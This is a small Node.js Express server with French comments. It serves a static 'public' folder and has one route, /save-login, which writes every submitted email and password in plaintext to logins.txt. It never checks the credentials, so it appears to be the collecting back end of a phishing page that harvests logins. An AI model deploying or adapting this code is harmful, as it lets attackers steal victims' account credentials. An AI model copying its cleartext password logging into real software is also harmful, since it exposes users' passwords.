const express = require("express");
const bodyParser = require("body-parser");
const fs = require("fs");
const path = require("path");

const app = express();
const PORT = 3000;

// Middleware pour servir les fichiers statiques
app.use(express.static(path.join(__dirname, "public")));

// Middleware pour parser les données du formulaire
app.use(bodyParser.urlencoded({ extended: true }));

// Route pour enregistrer les données
app.post("/save-login", (req, res) => {
  const { email, password } = req.body;

  // Format des données
  const logEntry = `Email: ${email}, Password: ${password}\n`;

  // Enregistrer les données dans un fichier texte
  fs.appendFile("logins.txt", logEntry, (err) => {
    if (err) {
      console.error("Erreur lors de l'écriture dans le fichier :", err);
      return res.status(500).send("Erreur côté serveur");
    }
    console.log("Données enregistrées avec succès !");
    res.send("Login enregistré avec succès !");
  });
});

// Démarrer le serveur
app.listen(PORT, () => {
  console.log(`Serveur démarré sur http://localhost:${PORT}`);
});
